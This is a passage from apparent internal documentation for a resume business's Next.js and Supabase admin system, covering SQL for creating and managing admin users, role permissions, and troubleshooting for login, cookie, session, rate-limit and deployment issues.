  role,
  email,
  encrypted_password,
  email_confirmed_at,
  created_at,
  updated_at,
  raw_app_meta_data,
  raw_user_meta_data,
  is_super_admin,
  confirmation_token,
  email_change_token_new,
  recovery_token
)
VALUES (
  '00000000-0000-0000-0000-000000000000',
  gen_random_uuid(),
  'authenticated',
  'authenticated',
  'new.admin@southwestresumes.com',  -- Change this
  crypt('SecurePassword123!', gen_salt('bf')),  -- Change this
  NOW(),
  NOW(),
  NOW(),
  '{"provider":"email","providers":["email"]}',
  '{}',
  FALSE,
  '',
  '',
  ''
)
RETURNING id;

-- Step 2: Create admin_users record (replace USER_ID with ID from above)
INSERT INTO admin_users (
  user_id,
  email,
  name,
  role,
  active,
  created_at,
  last_login_at
)
VALUES (
  'USER_ID_FROM_STEP_1',  -- Replace with actual UUID
  'new.admin@southwestresumes.com',
  'New Admin Name',
  'admin',  -- Options: super_admin, admin, viewer
  true,
  NOW(),
  NULL
);
```

**Method 2: Using Admin Dashboard (Future Enhancement)**

Currently not implemented. Planned feature for super_admin role.

### Modifying Admin User Permissions

**Change User Role:**
```sql
UPDATE admin_users
SET role = 'super_admin'  -- Options: super_admin, admin, viewer
WHERE email = 'user@southwestresumes.com';
```

**Deactivate User (Disable Access):**
```sql
UPDATE admin_users
SET active = false
WHERE email = 'user@southwestresumes.com';
```

**Reactivate User:**
```sql
UPDATE admin_users
SET active = true
WHERE email = 'user@southwestresumes.com';
```

### Permission Levels Explained

**Super Admin:**
- View all questionnaires
- Edit all questionnaires
- Delete questionnaires
- View all clients
- Edit all clients
- Manage admin users (add, edit, remove)
- View system settings
- Edit system settings

**Admin:**
- View all questionnaires
- Edit all questionnaires
- View all clients
- Edit all clients
- View system settings
- Cannot delete or manage users

**Viewer:**
- View all questionnaires (read-only)
- View all clients (read-only)
- Cannot edit, delete, or manage settings

---

## Troubleshooting Guide

### Issue 1: "Invalid credentials" on Login

**Symptoms:**
- User enters email and password
- Form shows "Invalid email or password"
- Login fails

**Possible Causes:**
1. Wrong email or password
2. User not in admin_users table
3. User exists but active = false
4. Supabase connection issue

**Diagnostic Steps:**

```sql
-- Step 1: Check if user exists in auth.users
SELECT email, confirmed_at
FROM auth.users
WHERE email = 'ryan.zimmerman@southwestresumes.com';

-- Step 2: Check if user exists in admin_users
SELECT email, role, active
FROM admin_users
WHERE email = 'ryan.zimmerman@southwestresumes.com';

-- Step 3: Check if user_id matches
SELECT au.email, au.active, u.email as auth_email
FROM admin_users au
LEFT JOIN auth.users u ON au.user_id = u.id
WHERE au.email = 'ryan.zimmerman@southwestresumes.com';
```

**Solutions:**

**If user missing from auth.users:**
- Run create-admin-user.sql script
- Verify email is correct

**If user missing from admin_users:**
```sql
-- Find user_id from auth.users
SELECT id FROM auth.users WHERE email = 'ryan.zimmerman@southwestresumes.com';

-- Insert admin_users record
INSERT INTO admin_users (user_id, email, name, role, active)
VALUES (
  'USER_ID_FROM_ABOVE',
  'ryan.zimmerman@southwestresumes.com',
  'Ryan Zimmerman',
  'super_admin',
  true
);
```

**If active = false:**
```sql
UPDATE admin_users
SET active = true
WHERE email = 'ryan.zimmerman@southwestresumes.com';
```

### Issue 2: Redirect Loop (Login → Admin → Login)

**Symptoms:**
- User logs in successfully
- Redirected to /admin
- Immediately redirected back to /admin/login
- Infinite loop

**Possible Causes:**
1. Cookies not being set
2. Cookies being set but not sent back
3. Middleware not reading cookies correctly
4. Session validation failing in layout

**Diagnostic Steps:**

```javascript
// Open Browser DevTools → Console
// Check if cookies are set after login
document.cookie; // Note: Won't show HTTP-only cookies

// Open DevTools → Application → Cookies
// Look for:
// - sb-access-token
// - sb-refresh-token

// Check Network tab after login
// Look at /admin request → Headers → Cookie
// Should include sb-access-token and sb-refresh-token
```

**Solutions:**

**If cookies not appearing in DevTools:**
```typescript
// Check cookie settings in lib/auth/admin-auth.ts
// Verify secure flag is correct for environment
secure: process.env.NODE_ENV === 'production'

// In development (localhost), secure should be false
// In production (HTTPS), secure should be true
```

**If cookies set but not sent:**
```typescript
// Check SameSite setting
sameSite: 'lax'  // Should be 'lax', not 'strict'

// Check Path setting
path: '/'  // Should be '/' to apply to all routes
```

**If middleware not reading cookies:**
```typescript
// Add logging to middleware.ts
const accessToken = request.cookies.get('sb-access-token');
console.log('[Middleware] Access token:', accessToken ? 'Present' : 'Missing');
```

### Issue 3: Session Expires Too Quickly

**Symptoms:**
- User logs in
- Within hours, session expires
- Expected: 7 days, Actual: < 1 day

**Possible Causes:**
1. Max-Age set incorrectly
2. Supabase token expiration misconfigured
3. Browser deleting cookies prematurely

**Diagnostic Steps:**

```javascript
// DevTools → Application → Cookies → sb-access-token
// Check "Expires / Max-Age" column
// Should be 7 days from login

// Check Supabase dashboard → Authentication → Settings
// JWT expiry should be 604800 seconds (7 days)
```

**Solutions:**

**If Max-Age incorrect:**
```typescript
// lib/auth/admin-auth.ts
maxAge: 60 * 60 * 24 * 7  // 7 days = 604800 seconds
```

**If Supabase expiration incorrect:**
1. Go to Supabase Dashboard
2. Settings → Authentication
3. JWT Expiry → 604800 seconds
4. Save settings

### Issue 4: "Too many login attempts" (Rate Limited)

**Symptoms:**
- User tries to login
- Error: "Too many login attempts. Please try again later."
- Cannot login even with correct credentials

**Possible Causes:**
- User attempted 5+ failed logins in 15 minutes
- Rate limit triggered for IP address
- Shared IP (corporate network, VPN)

**Diagnostic Steps:**

```typescript
// Check rate limit status
import { getRateLimitStatus } from '@/lib/security/rate-limit';

const status = getRateLimitStatus('admin_login:192.168.1.1');
console.log(status);
// Output: { count: 5, resetTime: 1703123456789, firstAttempt: 1703122556789 }
```

**Solutions:**

**Clear rate limit for specific IP:**
```typescript
import { clearRateLimit } from '@/lib/security/rate-limit';
clearRateLimit('admin_login:192.168.1.1');
```

**Wait for reset (automatic):**
- Rate limit resets after 15 minutes
- User can try again after reset time

**Adjust rate limit settings (if needed):**
```typescript
// app/api/admin/auth/login/route.ts
const MAX_LOGIN_ATTEMPTS = 10;  // Increase from 5 to 10
const LOGIN_WINDOW_MS = 15 * 60 * 1000;  // Keep 15 minutes
```

### Issue 5: Admin Routes Return 404

**Symptoms:**
- Navigate to /admin
- Page shows 404 Not Found
- Or blank page with no content

**Possible Causes:**
1. Admin routes not created
2. Build error during deployment
3. Incorrect file structure

**Diagnostic Steps:**

```bash
# Check if admin routes exist
ls -la app/admin/
# Should see: layout.tsx, page.tsx

ls -la app/admin/login/
# Should see: page.tsx

# Check build logs for errors
npm run build
# Look for errors in output
```

**Solutions:**

**If files missing:**
- Verify all admin route files exist
- Check git status for uncommitted changes
- Re-deploy if files missing in production

**If build errors:**
- Fix TypeScript errors
- Fix import errors
- Rebuild and redeploy

### Issue 6: Changes to Admin Code Not Reflecting

**Symptoms:**
- Update admin component code
- No changes visible in browser
- Old version still appears

**Possible Causes:**
1. Next.js cache not cleared
2. Browser cache
3. Server-side cache (Vercel)

**Solutions:**

**Clear Next.js cache:**
```bash
rm -rf .next
npm run dev
```

**Clear browser cache:**
- Chrome: Cmd+Shift+R (Mac) or Ctrl+Shift+R (Windows)
- Or open DevTools → Network → Disable cache

**Clear Vercel cache (if deployed):**
- Vercel Dashboard → Deployments → Redeploy

---

## Related Documentation

**Admin System Documentation:**
- `ADMIN-AUTH-ARCHITECTURE.md` - Technical architecture deep dive
- `ADMIN-AUTH-TROUBLESHOOTING.md` - Extended troubleshooting guide
- `ADMIN-ONBOARDING.md` - Developer onboarding guide
- `ADMIN_ROADMAP.md` - Admin feature roadmap

**Security Documentation:**
- `SECURITY-IMPLEMENTATION-GUIDE.md` - Complete security implementation
- `QUESTIONNAIRE-TOKEN-SYSTEM.md` - Token system technical details

**General Documentation:**
- `README.md` - Main project documentation
- `OWNERS_MANUAL.md` - Non-technical user guide

**Database Migrations:**
- `supabase/migrations/20251221_create_admin_users.sql` - Admin users table
- `lib/supabase/migrations/001_questionnaire_access_tokens.sql` - Tokens table
- `create-admin-user.sql` - Initial admin user setup

**Code Files:**
- `/lib/auth/admin-auth.ts` - Admin authentication utilities
- `/lib/auth/questionnaire-auth.ts` - Token generation and verification
- `/middleware.ts` - Route protection and security headers
- `/app/api/admin/auth/login/route.ts` - Login API endpoint
- `/app/admin/login/page.tsx` - Login page UI
- `/app/admin/layout.tsx` - Admin layout with authentication

---

**Document Version:** 1.0
**Last Updated:** December 22, 2025
**Next Review:** January 22, 2026
**Model:** Claude Sonnet 4.5 (claude-sonnet-4-5-20250929)
